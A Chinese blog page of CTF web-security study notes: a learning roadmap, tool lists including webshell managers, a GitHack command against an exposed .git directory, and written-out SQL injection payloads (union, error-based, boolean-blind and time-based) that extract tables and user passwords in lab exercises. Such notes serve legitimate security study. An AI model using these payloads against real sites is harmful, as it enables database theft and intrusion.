<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><title>Hexo</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '6.3.0'
} </script><meta name="generator" content="Hexo 6.3.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">John Doe</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">51</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">3</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">38</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Hexo</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Hexo</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2023/08/1b0a1e9c8caf.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-08-02</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/">culitivate</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/other/">other</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/other/CTF/">CTF</a></span><div class="content"><p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202308021038410.png" alt="image.png"></p>
<h1 id="学习平台"><a href="#学习平台" class="headerlink" title="学习平台"></a>学习平台</h1><p><img src="file:///C:\Users\Administrator\AppData\Roaming\Tencent\QQ\Temp[5UQ[BL(6~BS2JV6W}N6[%S.png"><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1eq4y1x71H?p=5&vd_source=51ce6b684d2afd4de72a9121533cd3ca">https://www.bilibili.com/video/BV1eq4y1x71H?p=5&amp;vd_source=51ce6b684d2afd4de72a9121533cd3ca</a><br>\<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1eq4y1x71H?p=5&vd_source=51ce6b684d2afd4de72a9121533cd3ca">https://www.bilibili.com/video/BV1eq4y1x71H?p=5&amp;vd_source=51ce6b684d2afd4de72a9121533cd3ca</a><br>练习平台<br><img src="file:///C:\Users\Administrator\AppData\Roaming\Tencent\QQ\Temp%W@GJ$ACOF(TYDYECOKVDYB.png"><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/407953508">https://zhuanlan.zhihu.com/p/407953508</a><br>\<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/407953508">https://zhuanlan.zhihu.com/p/407953508</a></p>
<p><img src="file:///C:\Users\Administrator\AppData\Roaming\Tencent\QQ\Temp%W@GJ$ACOF(TYDYECOKVDYB.png"><a target="_blank" rel="noopener" href="https://blog.csdn.net/wanzt123/article/details/75174675">https://blog.csdn.net/wanzt123/article/details/75174675</a></p>
<p><img src="file:///C:\Users\Administrator\AppData\Roaming\Tencent\QQ\Temp%W@GJ$ACOF(TYDYECOKVDYB.png"><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/393641905">https://zhuanlan.zhihu.com/p/393641905</a></p>
<p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202308021505060.png" alt="image.png"></p>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>Burp Suite<br>·主要功能:<br>1．拦截、查看或者修改网络请求和响应。2.扫描web应用程序的安全漏洞。<br>3．自动化攻击web应用。<br>4．对数据编码和解码。</p>
<p>HackBar<br>浏览器插件<br>帮助测试sql注入，xss漏洞利用</p>
<p>sqlmap<br>sql自动注入工具</p>
<p>webshell管理工具<br>蚁剑：网站管理工具<br>冰蝎：通信过程中使用AES加密<br>哥斯拉：替代工具</p>
<p>安全导航:<br>纳威安全导航: <a target="_blank" rel="noopener" href="https://navisec.it/">https://navisec.it/</a><br>安全圈info:<a target="_blank" rel="noopener" href="https://www.anquanquan.info/">https://www.anquanquan.info/</a><br>渗透师导航:<a target="_blank" rel="noopener" href="https://www.shentoushi.top/">https://www.shentoushi.top/</a></p>
<h1 id="日程安排"><a href="#日程安排" class="headerlink" title="日程安排"></a>日程安排</h1><h2 id="4-1、初期"><a href="#4-1、初期" class="headerlink" title="4.1、初期"></a>4.1、初期</h2><p>刚刚走进大学，入了web安全的坑，面对诸多漏洞必然是迷茫的，这时的首要任务就是打好网站开发的基础，曾有伟人说过-“自己不会做网站，何谈去找网站的漏洞”，在学习漏洞前，了解基本网站架构、基础网站开发原理，基础的前后端知识，能够让你之后的漏洞学习畅通无阻。</p>
<h3 id="0、协议基础：HTTP、TCP-x2F-IP"><a href="#0、协议基础：HTTP、TCP-x2F-IP" class="headerlink" title="0、协议基础：HTTP、TCP&#x2F;IP"></a>0、协议基础：HTTP、TCP&#x2F;IP</h3><h3 id="1、html-css-js（2-3天）"><a href="#1、html-css-js（2-3天）" class="headerlink" title="1、html+css+js（2-3天）"></a>1、html+css+js（2-3天）</h3><p>前端三要素 html、css、js是被浏览器解析的代码，是构成静态页面的基础。也是前端漏洞如xss、csrf的基础。</p>
<p><strong>☆重点了解html和js</strong></p>
<p>推荐学习资料：</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://www.runoob.com/">https://www.runoob.com/</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.w3school.com.cn/">https://www.w3school.com.cn/</a></li>
</ul>
<p>能力要求：</p>
<ul>
<li>能够写出简单表单，能够通过js获取DOM元素，控制DOM树即可。</li>
</ul>
<h3 id="2、apache-php-（4-5天）"><a href="#2、apache-php-（4-5天）" class="headerlink" title="2、apache+php （4-5天）"></a>2、apache+php （4-5天）</h3><p>推荐使用phpstudy来进行傻瓜式安装，可以少走很多弯路。通过apache+php体会一下网站后端的工作，客户端浏览器通过请求apache服务器上的php脚本，php执行后生成的html页面返回给浏览器进行解析。</p>
<p><strong>☆重点了解php</strong></p>
<p>推荐学习资料：</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://www.runoob.com/">https://www.runoob.com/</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.w3school.com.cn/">https://www.w3school.com.cn/</a></li>
</ul>
<p>能力要求：</p>
<ul>
<li>了解基本网站原理，了解php基本语法，开发简单动态页面</li>
</ul>
<h3 id="3、mysql-（2-3天）"><a href="#3、mysql-（2-3天）" class="headerlink" title="3、mysql （2-3天）"></a>3、mysql （2-3天）</h3><p>之前已经安装的phpstudy可以轻易的安装mysql。mysql是一款典型的关系型数据库，一般来说，大部分网站都会带有数据库进行数据存储。</p>
<p><strong>☆重点了解sql语句</strong></p>
<p>推荐学习资料：</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://www.runoob.com/">https://www.runoob.com/</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.w3school.com.cn/">https://www.w3school.com.cn/</a></li>
</ul>
<p>能力要求：</p>
<ul>
<li>能够用sql语句实现增删改查，并且能用php+mysql开发一个增删改查的管理系统（如学生管理系统）</li>
</ul>
<h3 id="4、python-2-3天"><a href="#4、python-2-3天" class="headerlink" title="4、python (2-3天)"></a>4、python (2-3天)</h3><p>虽然 “php是最好的语言”，但它主要还是应用在服务端做网站开发，我们搞安全经常需要写一些脚本或工具来进行诸如密码爆破、目录扫描、攻击自动化等操作，需要一个方便且趁手的编程语言，这里我推荐python</p>
<p><strong>☆重点学习requests、BeautifulSoup、re这三个库</strong></p>
<p>推荐学习资料</p>
<ul>
<li><a href="https://link.zhihu.com/?target=https://www.runoob.com/">https://www.runoob.com/</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.w3school.com.cn/">https://www.w3school.com.cn/</a></li>
</ul>
<p>能力要求：</p>
<ul>
<li>了解python基础语法，能够用python爬取网站上的信息（requests+BeautifulSoup+re）</li>
</ul>
<h3 id="5、burpsuite-（1-2天）"><a href="#5、burpsuite-（1-2天）" class="headerlink" title="5、burpsuite （1-2天）"></a>5、burpsuite （1-2天）</h3><p>web安全的工具很多，但我觉得必备的渗透工具还得是它</p>
<p>重点学习Proxy、Repeater、Intruder三个模块，分别用于抓包放包、重放包、爆破</p>
<p>初步使用即可，在中期的漏洞学习中去逐渐熟练它</p>
<p>推荐学习资料</p>
<ul>
<li>DVWA之暴力破解</li>
</ul>
<p>能力要求：</p>
<ul>
<li>能够用burpsuite抓包改包、爆破用户名密码</li>
</ul>
<h2 id="4-2、中期"><a href="#4-2、中期" class="headerlink" title="4.2、中期"></a>4.2、中期</h2><p>此时我们对网站已经不再陌生，能够自己动手完成一个简单站点。但我们写出来的代码真的安全吗？进入中期，我们便要开始着眼经典漏洞的学习。</p>
<p>一个漏洞的学习，要搞明白三点（每学完一个漏洞就问自己这三个问题）：</p>
<ul>
<li>如何利用这个漏洞？</li>
<li>为什么会产生这个漏洞？</li>
<li>如何修复这个漏洞？</li>
</ul>
<h3 id="1、SQL注入（7-8天）"><a href="#1、SQL注入（7-8天）" class="headerlink" title="1、SQL注入（7-8天）"></a>1、SQL注入（7-8天）</h3><p>我们web狗学习的第一个漏洞一般都是SQL注入，它是web安全经典fg中的经典，也是在这里被灌输 “永远不信任用户的输入” 的口号，即使是现在sql注入也依旧存在，并且它还在不断衍生出如nosql注入、ORM注入等，可谓防不胜防。</p>
<p>推荐学习资料：</p>
<ul>
<li>sqli-labs：如何使用它网上有很多教学，wp也有很多大佬写了 这里贴一个<a href="https://link.zhihu.com/?target=https://blog.csdn.net/wang_624/article/details/101913584">https://blog.csdn.net/wang_624&#x2F;article&#x2F;details&#x2F;101913584</a></li>
<li>sqlmap：sql注入神器，有余力可以去看看它的源码，学习一下大佬进行sql注入并把它自动化的思路</li>
<li>buuctf：找相关的真题进行练习 wp百度一搜就有</li>
<li>[极客大挑战 2019]EasySQL</li>
<li>[极客大挑战 2019]LoveSQL</li>
<li>[SUCTF 2019]EasySQL</li>
</ul>
<p>能力要求：</p>
<ul>
<li>能够手工注入出任意表的数据，熟悉三种盲注的手法，能够通过sql注入实现任意文件读取和任意文件写入，能够自己编写一个不含sql注入的查询功能</li>
</ul>
<h3 id="2、文件上传（7-8天）"><a href="#2、文件上传（7-8天）" class="headerlink" title="2、文件上传（7-8天）"></a>2、文件上传（7-8天）</h3><p>webshell是可以进行代码执行的木马</p>
<p>而文件上传其实就是想办法把webshell上传到目标的服务器上去并成功解析，达到控制目标服务器的目的，这也是web安全的一个重点内容</p>
<p>推荐学习资料</p>
<ul>
<li>upload-labs：几乎涵盖所有上传漏洞类型</li>
<li>buuctf：找相关的真题进行练习（[ACTF2020 新生赛]Upload）</li>
<li>趁手的webshell管理工具： 蚁剑</li>
</ul>
<p>能力要求：</p>
<ul>
<li>会写php的webshell，明白webshell的原理，熟悉常见的文件上传绕过方法（如过后缀检测、过文件头检测、过MIME类型检测），能够自己编写一个不含漏洞的上传功能</li>
</ul>
<h3 id="3、其他漏洞（14-15天）"><a href="#3、其他漏洞（14-15天）" class="headerlink" title="3、其他漏洞（14-15天）"></a>3、其他漏洞（14-15天）</h3><p>以上两个漏洞是我认为一个初学者最应该掌握也是最典型的漏洞，涵盖了代码执行、文件操作、数据库操作等web应用的主体内容。然而web安全的世界还有很多的漏洞需要你去探索，不过学会了这两种漏洞的你去学其他漏洞定然是游刃有余，不会像刚开始那么困惑了。</p>
<p>以下四个为中期要掌握的漏洞</p>
<ul>
<li>命令执行（RCE）：php常见的代码执行（eval）、命令执行（system）函数</li>
<li>文件包含：file协议、php伪协议的利用</li>
<li>XSS：通过XSS获取用户cookie</li>
<li>CSRF：通过csrf让用户点击恶意链接就触发敏感操作</li>
</ul>
<h2 id="4-3、后期"><a href="#4-3、后期" class="headerlink" title="4.3、后期"></a>4.3、后期</h2><p>此时的你熟悉了web安全几个核心的漏洞，并且有了一些ctf题目的练习经验，已经是一个合格的ctfer了。恭喜你。成功入门web安全。后续的学习方法或许该由你自己决定，我在此只给一些建议。</p>
<h1 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h1><p><a target="_blank" rel="noopener" href="https://www.wolai.com/ctfhub/bRAuA3ejCzD2461TFrJada">基础知识 (wolai.com)</a></p>
<ul>
<li><strong>MISC（安全杂项）</strong>：全称Miscellaneous。题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广。我们平时看到的社工类题目；给你一个流量包让你分析的题目；取证分析题目，都属于这类题目。主要考查参赛选手的各种基础综合知识，考察范围比较广。</li>
<li><strong>PPC（编程类）</strong>：全称Professionally Program Coder。题目涉及到程序编写、编程算法实现。算法的逆向编写，批量处理等，有时候用编程去处理问题，会方便的多。当然PPC相比ACM来说，还是较为容易的。至于编程语言嘛，推荐使用Python来尝试。这部分主要考察选手的快速编程能力。</li>
<li><strong>CRYPTO（密码学）</strong>：全称Cryptography。题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。实验吧“角斗场”中，这样的题目汇集的最多。这部分主要考查参赛选手密码学相关知识点。</li>
<li><strong>REVERSE（逆向）</strong>：全称reverse。题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。需要掌握汇编，堆栈、寄存器方面的知识。有好的逻辑思维能力。主要考查参赛选手的逆向分析能力。此类题目也是线下比赛的考察重点。</li>
<li><strong>STEGA（隐写）</strong>：全称Steganography。隐写术是我开始接触CTF觉得比较神奇的一类，知道这个东西的时候感觉好神奇啊，黑客们真是聪明。题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛选手获取。载体就是图片、音频、视频等，可能是修改了这些载体来隐藏flag，也可能将flag隐藏在这些载体的二进制空白位置。有时候需要你侦探精神足够的强，才能发现。此类题目主要考查参赛选手的对各种隐写工具、隐写算法的熟悉程度。实验吧“角斗场”的隐写题目在我看来是比较全的，以上说到的都有涵盖。新手盆友们可以去了解下。</li>
<li><strong>PWN（溢出）</strong>：PWN在黑客俚语中代表着攻破，取得权限，在CTF比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有栈溢出、堆溢出。在CTF比赛中，线上比赛会有，但是比例不会太重，进入线下比赛，逆向和溢出则是战队实力的关键。主要考察参数选手漏洞挖掘和利用能力。<br> <strong>WEB（web类）</strong>：WEB应用在今天越来越广泛，也是CTF夺旗竞赛中的主要题型，题目涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码审计、上传等漏洞。这些题目都不是简单的注入、上传题目，至少会有一层的安全过滤，需要选手想办法绕过。且Web题目是国内比较多也是大家比较喜欢的题目。因为大多数人开始安全都是从web日站开始的。</li>
</ul>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="1-Linux-基本命令"><a href="#1-Linux-基本命令" class="headerlink" title="1.Linux 基本命令"></a>1.Linux 基本命令</h3><p><a href="Linux.md">Linux</a></p>
<h3 id="2-http、TCP-x2F-IP协议"><a href="#2-http、TCP-x2F-IP协议" class="headerlink" title="2.http、TCP&#x2F;IP协议"></a>2.http、TCP&#x2F;IP协议</h3><p><a href="%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE.md">网络协议</a></p>
<h3 id="3-SQL、PHP、JS"><a href="#3-SQL、PHP、JS" class="headerlink" title="3.SQL、PHP、JS"></a>3.SQL、PHP、JS</h3><p><a href="PHP%E7%AC%94%E8%AE%B0.md">PHP笔记</a></p>
<h2 id="工具学习"><a href="#工具学习" class="headerlink" title="工具学习"></a>工具学习</h2><h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><p>·主要功能:<br>1．拦截、查看或者修改网络请求和响应。<br>2.扫描web应用程序的安全漏洞。<br>3．自动化攻击web应用。<br>4．对数据编码和解码。</p>
<p>教程：<br>\<a target="_blank" rel="noopener" href="https://blog.csdn.net/Forget_liu/article/details/129824815">https://blog.csdn.net/Forget_liu/article/details/129824815</a></p>
<p>\<a target="_blank" rel="noopener" href="https://blog.csdn.net/YQavenger/article/details/108611357?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-108611357-blog-129824815.235%5Ev38%5Epc_relevant_sort_base2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-108611357-blog-129824815.235%5Ev38%5Epc_relevant_sort_base2&utm_relevant_index=2">https://blog.csdn.net/YQavenger/article/details/108611357?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-108611357-blog-129824815.235%5Ev38%5Epc_relevant_sort_base2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-108611357-blog-129824815.235%5Ev38%5Epc_relevant_sort_base2&amp;utm_relevant_index=2</a></p>
<p>\<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/547973012?utm_id=0">https://zhuanlan.zhihu.com/p/547973012?utm_id=0</a><br>应用场景：<br>\<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15127666/4516339">https://blog.51cto.com/u_15127666/4516339</a></p>
<h3 id="HackBar"><a href="#HackBar" class="headerlink" title="HackBar"></a>HackBar</h3><p>浏览器插件<br>帮助测试sql注入，xss漏洞利用</p>
<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sql自动注入工具</p>
<p>sqlmap教程：<br>\<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33530840/article/details/82144515">https://blog.csdn.net/qq_33530840/article/details/82144515</a><br>\<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p>
<h3 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h3><p>蚁剑：网站管理工具<br>冰蝎：通信过程中使用AES加密<br>哥斯拉：替代工具<br>查看隐藏文件，网址</p>
<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><p>git泄露，目录扫描<br>用于发现git泄露<br>教程：<br>\<a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13600490.html">https://www.cnblogs.com/linfangnan/p/13600490.html</a></p>
<p>命令：<br>\<a target="_blank" rel="noopener" href="http://www.onctf.com/posts/b4763959.html">http://www.onctf.com/posts/b4763959.html</a></p>
<p>dirsearch发现git泄露<br>githack获取源码<br>activate cc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http://220.249.52.133:58698/.git/</span><br></pre></td></tr></table></figure>
<p>进行代码审计</p>
<h2 id="Misc（杂项）"><a href="#Misc（杂项）" class="headerlink" title="Misc（杂项）"></a>Misc（杂项）</h2><p>解码：<br>\<a target="_blank" rel="noopener" href="https://www.codeeeee.com/encrypt/rabbit.html">https://www.codeeeee.com/encrypt/rabbit.html</a><br>\<a target="_blank" rel="noopener" href="https://www.iamwawa.cn/">https://www.iamwawa.cn/</a></p>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>匹配网站<br>\<a target="_blank" rel="noopener" href="https://regexr.com/">https://regexr.com/</a><br>菜鸟教程：<br>\<a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-tutorial.html">https://www.runoob.com/regexp/regexp-tutorial.html</a></p>
<h3 id="文件操作与隐写"><a href="#文件操作与隐写" class="headerlink" title="文件操作与隐写"></a>文件操作与隐写</h3><h3 id="图片隐写术"><a href="#图片隐写术" class="headerlink" title="图片隐写术"></a>图片隐写术</h3><p>工具<br>\<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62770485/article/details/124231894">https://blog.csdn.net/m0_62770485/article/details/124231894</a><br>思路<br>\<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_14449312/3902300">https://blog.51cto.com/u_14449312/3902300</a><br>1.winhex看文本<br>2.stegdetect检测<br>\<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1875">https://xz.aliyun.com/t/1875</a></p>
<h3 id="压缩文件处理"><a href="#压缩文件处理" class="headerlink" title="压缩文件处理"></a>压缩文件处理</h3><h3 id="流量取证技术"><a href="#流量取证技术" class="headerlink" title="流量取证技术"></a>流量取证技术</h3><h2 id="Crypto（密码学）"><a href="#Crypto（密码学）" class="headerlink" title="Crypto（密码学）"></a>Crypto（密码学）</h2><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>思路：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64815693/article/details/126834664">https://blog.csdn.net/m0_64815693/article/details/126834664</a><br>\<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64815693/article/details/126834664">https://blog.csdn.net/m0_64815693/article/details/126834664</a></p>
<h3 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a>一、SQL注入</h3><p>sqlmap教程：<br>\<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p>
<p>sql注入教程：<br>\<a target="_blank" rel="noopener" href="https://www.cnblogs.com/snad/p/17247726.html">https://www.cnblogs.com/snad/p/17247726.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># table 1</span><br><span class="line">schemata --&gt; 存储该用户创建的所有数据库的库名</span><br><span class="line">schema_name --&gt; 记录数据库库名的字段</span><br><span class="line"></span><br><span class="line"># table 2</span><br><span class="line">tables --&gt; 存储该用户创建的所有数据库的库名和表名</span><br><span class="line">table_schema --&gt; 记录数据库库名的字段</span><br><span class="line">table_name --&gt; 记录数据库表名的字段</span><br><span class="line"></span><br><span class="line"># table 3</span><br><span class="line">columns --&gt; 存储该用户创建所有数据库的库名、表名和字段名</span><br><span class="line">table_schema --&gt; 记录数据库库名的字段</span><br><span class="line">table_name --&gt; 记录数据库表名的字段</span><br><span class="line">column_name --&gt; 记录表中的字段名的字段</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="1-联合查询注入"><a href="#1-联合查询注入" class="headerlink" title="1.联合查询注入"></a>1.联合查询注入</h4><p>CnHongke{8sblmmh65nu1sdki40od3iiud7}</p>
<p>爆库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `uu` WHERE flag=&#x27;a&#x27;  UNION select 1,2,group_concat(table_name) from information_schema.`TABLES` WHERE table_schema=database()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema = &#x27;dvwa&#x27; #</span><br></pre></td></tr></table></figure>
<p>爆表字段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(column_name)  from information_schema.columns where table_schema=database() and table_name=&#x27;user&#x27;</span><br></pre></td></tr></table></figure>
<p>构造payload获取值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(id),group_concat(username) from user</span><br></pre></td></tr></table></figure>


<h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h4><p><strong>1.通过updatexml()函数进行报错注入</strong><br>函数解释：<br><strong>UPDATEXML (XML_document, XPath_string, new_value);</strong><br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 xml_target 新的XML片段 new_xml ，然后返回更 改的XML。xml_target替换的部分 与xpath_expr 用户提供的XPath表达式匹配。如果未xpath_expr找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 xml_targetXML片段。</p>
<p>报错原理<br>这里和extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容。</p>
<p>约束条件<br>输出字符长度限制为32个字符</p>
<p><strong>?id&#x3D;1’ and updatexml(1, concat(0x7e, database(),0x7e),1) – a</strong></p>
<p><strong>?id&#x3D;1’ and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables</strong><br><strong>where table_schema &#x3D; database()), 0x7e), 1) – a</strong></p>
<p><strong>?id&#x3D;1’ and updatexml(1, concat(0x7e, (select group_concat(column_name) from</strong><br><strong>information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; ‘users’), 0x7e),1) – a</strong></p>
<p><strong>?id&#x3D;1’ and updatexml(1, concat(0x7e, (select group_concat(username) from users), 0x7e),1) – a</strong><br><strong>?id&#x3D;1’ and updatexml(1, concat(0x7e, (select group_concat(password) from users), 0x7e),1) – a</strong></p>
<h4 id="3-Bool盲注"><a href="#3-Bool盲注" class="headerlink" title="3.Bool盲注"></a>3.Bool盲注</h4><p><strong>① 判断数据库的长度</strong><br><strong>?id&#x3D;1’ and length(database())&gt;7 – a</strong><br><strong>?id&#x3D;1’ and length(database())&gt;8 – a   回显不同，说明数据库的长度是8个字符</strong><br><strong>① 获取数据库名</strong><br><strong>?id&#x3D;1’ and ascii(substr(select database(),1,1))&#x3D;97 – a</strong></p>
<p><strong>② 判断库里表的个数</strong><br><strong>?id&#x3D;1’ and (select count(table_name) from information_schema.tables where table_schema &#x3D; database()) &gt; 3 – a</strong><br><strong>?id&#x3D;1’ and (select count(table_name) from information_schema.tables where table_schema &#x3D; database()) &gt; 4 – a</strong></p>
<p><strong>③ 获取库里各个表名的长度</strong><br><strong>?id&#x3D;1’ and length(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0, 1)&gt;8 – a</strong><br><strong>③ 获取库里第一个表名中的第一个字符的ASCII值，可以此推断出表名，可借助bp爆破</strong><br><strong>?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema &#x3D;</strong><br><strong>database() limit 0, 1),1,1))&#x3D;101 – a</strong></p>
<p><strong>④ 获取users表里的字段数</strong><br><strong>?id&#x3D;1’ and (select count(column_name) from information_schema.columns where table_schema &#x3D;</strong><br><strong>database() and table_name &#x3D; ‘users’) &#x3D; 3 – a</strong></p>
<p><strong>⑤ 获取各字段(列名)长度</strong><br><strong>?id&#x3D;1’ and length(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name &#x3D; ‘users’ limit 0, 1)&gt;8 – a</strong><br><strong>⑤ 获取字段名称</strong><br><strong>?id&#x3D;1’ and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;</strong><br><strong>database() and table_name &#x3D; ‘users’ limit 0, 1), 1, 1) )&#x3D;97 – a</strong></p>
<p><strong>⑥ 获取字段值</strong><br><strong>?id&#x3D;1’ and ascii(substr((select username from users limit 0, 1), 1, 1)) &#x3D; 97 – a</strong><br><strong>?id&#x3D;1’ and ascii(substr((select group_concat(username) from users), 1, 1)) &#x3D; 97 – a</strong></p>
<h4 id="4-宽字节（时间）注入"><a href="#4-宽字节（时间）注入" class="headerlink" title="4.宽字节（时间）注入"></a>4.宽字节（时间）注入</h4><p><strong>?id&#x3D;1’ and if(length(database()) &#x3D; 8, sleep(5), 1) – a</strong> 睡了5秒<br>因为没有回显，可在布尔盲注上加上if(布尔盲注语句,sleep(5),1)，通过时间判断对错</p>
<p>主要通过if() 和substr() 和sleep()</p>
<h4 id="5-二次注入"><a href="#5-二次注入" class="headerlink" title="5.二次注入"></a>5.二次注入</h4><p>第一次过滤了’等特殊字符  但后面更新是没有过滤’等特殊字符 导致更新是二次注入</p>
